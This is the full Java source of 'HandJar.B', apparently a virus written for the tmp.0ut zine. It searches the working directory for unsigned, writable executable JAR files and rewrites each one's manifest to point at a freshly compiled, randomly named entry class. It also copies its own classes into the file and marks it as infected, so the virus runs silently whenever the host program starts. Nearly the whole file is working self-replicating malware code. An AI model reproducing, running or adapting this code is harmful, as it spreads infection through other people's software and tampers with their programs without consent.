/**
 * HandJar.B
 *
 * @autor R3s1stanc3 r3s1stanc3@vbrandl.net
 * @version 2.0
 */
package edu.vx;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.security.SecureRandom;
import java.text.MessageFormat;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.regex.Pattern;
import java.util.zip.*;
import javax.tools.*;

public class HandJar {
  /** Infection marker. If this file exists in a JAR file, it is infected. */
  private static final String MARKER = "doesthislookinfected?";

  private static final String ENTRYPOINT = "Main-Class";
  private static final Pattern MANIFEST_SEP = Pattern.compile(Pattern.quote(": "));
  private static final Pattern PACKAGE_SEPARATOR = Pattern.compile(Pattern.quote("."));

  /**
   * The JAR spec defines newline as:
   *
   * <p>newline: CR LF | LF | CR (not followed by LF)
   */
  private static final Pattern LINE_SEP = Pattern.compile("(\\r?\\n|\\r)");

  private static final char[] ALPHABET =
      "abcdefghjiklmnopqrstuvqxyzABCDEFGHJIKLMNOPQRSTUVQXYZ".toCharArray();
  // all classes from the virus itself, that start with the same patterns, will be copied to the new
  // host
  private static final Set<String> MY_CLASSES =
      Collections.unmodifiableSet(
          new HashSet<>(
              Arrays.asList(
                  "edu/vx/InMemoryJavaFile", "edu/vx/InMemoryFileManager", "edu/vx/HandJar")));

  private static String randomClassName(int len) {
    Random rand = new SecureRandom();
    StringBuilder result = new StringBuilder();
    for (int i = 0; i < len; i++) {
      result.append(ALPHABET[rand.nextInt(ALPHABET.length)]);
    }
    return result.toString();
  }

  public static void main(String args[]) throws IOException {
    Path myName = currentExe();

    try (DirectoryStream<Path> jars =
        Files.newDirectoryStream(
            Paths.get("./"),
            p ->
                // only *.jar and infection candidates
                p.toString().toLowerCase().endsWith(".jar") && isInfectionCandidate(p))) {
      for (Path victim : jars) {
        try {
          String[] manifest =
              lines(
                  new String(
                      readFromArchive(victim, "META-INF/MANIFEST.MF"), StandardCharsets.UTF_8));

          boolean isSigned = readManifest(manifest, "Signature-Version") != null;
          if (isSigned) {
            // if the `Signature-Version` property exists, the JAR is signed and we should not
            // infect
            continue;
          }

          String oldEntry = readManifest(manifest, ENTRYPOINT);
          if (oldEntry == null) {
            // no `Main-Class` in manifest. Might be a library
            continue;
          }

          // make sure the entrypoint does not overwrite an existing class
          Set<String> victimClasses = loadClasses(victim);
          String newEntryName;
          do {
            newEntryName = randomClassName(32);
          } while (victimClasses.contains(newEntryName));

          String entryTemplate =
              //              (newEntryName.contains(".") ? "import {1};\n" : "")
              "public class {0} '{'\n"
                  + "  public static void main(String args[]) '{'\n"
                  + "     new Thread(\n"
                  + "         () -> javax.swing.JOptionPane.showMessageDialog(null, \"Hi this is HandJar.B\\nand welcome to tmp.0ut #3!\")\n"
                  + "     ).start();\n"
                  + "     new Thread(\n"
                  + "         () -> '{'"
                  + "          try '{'\n"
                  + "           edu.vx.HandJar.main(args);\n"
                  + "         '}' catch (Exception e) '{' '}'\n"
                  + "       '}'\n"
                  + "     ).start();\n"
                  + "     {1}.main(args);\n"
                  + "  '}'\n"
                  + "'}'\n";

          //          String[] packagePath = PACKAGE_SEPARATOR.split(oldEntry);
          //          String className = packagePath[packagePath.length - 1];
          String entryPointSource = MessageFormat.format(entryTemplate, newEntryName, oldEntry);

          try (InMemoryFileManager fileManager =
              compile(
                  Arrays.asList(
                      new InMemoryJavaFile(newEntryName, entryPointSource),
                      entryDummy(oldEntry)))) {

            // compilation failed
            if (fileManager == null) {
              continue;
            }

            String newManifest = joinManifest(writeManifest(manifest, ENTRYPOINT, newEntryName));

            Map<String, byte[]> contents = new HashMap<>();
            String entryClass = newEntryName + ".class";
            for (JavaFileObject jfo : fileManager.storage().values()) {
              if (jfo.getName().endsWith(entryClass)) {
                try (InputStream is = jfo.openInputStream()) {
                  contents.put(entryClass, readAllBytes(is));
                }
                break;
              }
            }

            contents.put("META-INF/MANIFEST.MF", newManifest.getBytes(StandardCharsets.UTF_8));

            // mark as infected
            contents.put(MARKER, new byte[0]);
            Map<Path, Iterable<String>> partialArchives = new HashMap<>();
            partialArchives.put(myName, MY_CLASSES);

            byte[] infected =
                createJar(contents, Collections.singletonList(victim), partialArchives);

            // write infected contents to a temporary file and move over to the victim to prevent
            // destroying the victim if writing fails.
            move(createTempFile(infected), victim);
          }
        } catch (IOException e) { // NOPMD: fail silently
        }
      }
    }
  }

  /**
   * Checks if a file is a candidate for infection. This means no infection marker and no class
   * named as one of the virus classes in the target.
   *
   * @param archive The archive to check
   * @return
   */
  public static boolean isInfectionCandidate(Path archive) {
    File archiveFile = archive.toFile();
    if (!(archiveFile.canRead() && archiveFile.canWrite())) {
      return false;
    }
    try (JarFile jf = new JarFile(archive.toFile())) {
      for (JarEntry entry : Collections.list(jf.entries())) {
        // already infected
        if (entry.getName().contains(MARKER)
            // contains a class named like one of the virus classes
            || MY_CLASSES.stream().anyMatch(cl -> entry.getName().startsWith(cl))) {
          // not a candidate for infection
          return false;
        }
      }
    } catch (IOException e) {
      return false;
    }
    return true;
  }

  private static Path currentExe() {
    return Paths.get(System.getProperty("java.class.path")).normalize();
  }

  public static void copy(InputStream input, OutputStream output) throws IOException {
    byte[] buffer = new byte[4096 * 1024];
    int bytesRead;
    while ((bytesRead = input.read(buffer)) != -1) {
      output.write(buffer, 0, bytesRead);
    }
  }

  public static byte[] readAllBytes(InputStream is) throws IOException {
    try (ByteArrayOutputStream buffer = new ByteArrayOutputStream()) {
      copy(is, buffer);
      return buffer.toByteArray();
    }
  }

  private static byte[] readFromArchive(Path archive, String file) throws IOException {
    try (JarFile jf = new JarFile(archive.toFile())) {
      ZipEntry entry = jf.getEntry(file);
      try (InputStream is = jf.getInputStream(entry)) {
        return readAllBytes(is);
      }
    }
  }

  public static InMemoryFileManager compile(Collection<JavaFileObject> sourceFiles) {
    JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
    if (null == compiler) {
      // running on JRE. No compiler available
      return null;
    }
    InMemoryFileManager fileManager =
        new InMemoryFileManager(compiler.getStandardFileManager(null, null, null));
    Writer nullWriter =
        // null-writer to hide compiler output
        new Writer() {
          @Override
          public void write(char[] buf, int off, int len) {}

          @Override
          public void flush() {}

          @Override
          public void close() {}
        };
    JavaCompiler.CompilationTask task =
        compiler.getTask(/*nullWriter*/ null, fileManager, null, null, null, sourceFiles);
    return task.call() ? fileManager : null;
  }

  private static byte[] createJar(
      Map<String, byte[]> contents,
      Iterable<Path> archives,
      Map<Path, Iterable<String>> partialArchives)
      throws IOException {
    try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
      try (JarOutputStream zos = new JarOutputStream(baos)) {
        // keep track of created entries. JarOutputStream will throw if an entry gets added twice
        Set<String> seenNames = new HashSet<>();
        for (Map.Entry<String, byte[]> content : contents.entrySet()) {
          String name = content.getKey();
          if (seenNames.add(name)) {
            zos.putNextEntry(new JarEntry(name));
            zos.write(content.getValue());
          }
        }
        for (Path archive : archives) {
          try (JarFile jf = new JarFile(archive.toFile())) {
            for (JarEntry oldEntry : Collections.list(jf.entries())) {
              if (!oldEntry.isDirectory() && seenNames.add(oldEntry.getName())) {
                zos.putNextEntry(new JarEntry(oldEntry));
                copy(jf.getInputStream(oldEntry), zos);
              }
            }
          }
        }
        for (Map.Entry<Path, Iterable<String>> archive : partialArchives.entrySet()) {
          try (JarFile zf = new JarFile(archive.getKey().toFile())) {
            for (JarEntry oldEntry : Collections.list(zf.entries())) {
              if (!oldEntry.isDirectory()) {
                for (String pattern : archive.getValue()) {
                  if (oldEntry.getName().startsWith(pattern) && seenNames.add(oldEntry.getName())) {
                    zos.putNextEntry(new JarEntry(oldEntry));
                    copy(zf.getInputStream(oldEntry), zos);
                    break;
                  }
                }
              }
            }
          }
        }
      }
      return baos.toByteArray();
    }
  }

  private static InMemoryJavaFile entryDummy(String oldEntry) {
    String[] packageAndClassName = PACKAGE_SEPARATOR.split(oldEntry);
    String className = packageAndClassName[packageAndClassName.length - 1];
    String packageName =
        String.join(".", Arrays.copyOf(packageAndClassName, packageAndClassName.length - 1));

    String dummyTemplate =
        (packageName.isEmpty() ? "" : "package {0};")
            + "public class {1} '{' public static void main(String args[]) '{' '}' '}'";
    String dummySource = MessageFormat.format(dummyTemplate, packageName, className);
    return new InMemoryJavaFile(oldEntry, dummySource);
  }

  protected static String[] lines(String input) {
    return LINE_SEP.split(input);
  }

  protected static String readManifest(String[] lines, String key) {
    for (String line : lines) {
      String[] keyValue = MANIFEST_SEP.split(line, 2);
      // keys are case-insensitive
      if (keyValue.length == 2 && keyValue[0].equalsIgnoreCase(key)) {
        return String.join(": ", keyValue[1]);
      }
    }
    return null;
  }

  protected static String[] writeManifest(String[] manifest, String key, String newValue) {
    List<String> result = new ArrayList<>(manifest.length + 1);
    boolean replacedKey = false;
    for (int i = 0; i < manifest.length; i++) {
      String line = manifest[i];
      String[] keyValue = MANIFEST_SEP.split(line, 2);
      // keys are case-insensitive
      if (keyValue.length == 2 && keyValue[0].equalsIgnoreCase(key)) {
        result.add(keyValue[0] + ": " + newValue);
        replacedKey = true;
      } else {
        result.add(line);
      }
    }
    // the key was not present in the manifest. Adding new entry
    if (!replacedKey) {
      result.add(key + ": " + newValue);
    }
    return result.toArray(new String[0]);
  }

  protected static String joinManifest(String[] manifest) {
    StringBuilder result = new StringBuilder();
    for (String kv : manifest) {
      result.append(kv).append("\n");
    }
    return result.toString();
  }

  private static void move(Path source, Path target) throws IOException {
    try {
      Files.move(
          source, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
    } catch (AtomicMoveNotSupportedException e) {
      // if the atomic move failed, move non-atomic
      Files.move(source, target, StandardCopyOption.REPLACE_EXISTING);
    }
  }

  private static Path createTempFile(byte[] content) throws IOException {
    Path tempFile = Files.createTempFile("", "");
    Files.write(tempFile, content);
    return tempFile;
  }

  private static Set<String> loadClasses(Path jar) throws IOException {
    try (JarFile jf = new JarFile(jar.toFile())) {
      Set<String> classes = new HashSet<>();
      for (JarEntry entry : Collections.list(jf.entries())) {
        String name = entry.getName();
        if (name.endsWith(".class")) {
          classes.add(name.substring(0, name.length() - ".class".length()).replace('/', '.'));
        }
      }
      return classes;
    }
  }
}
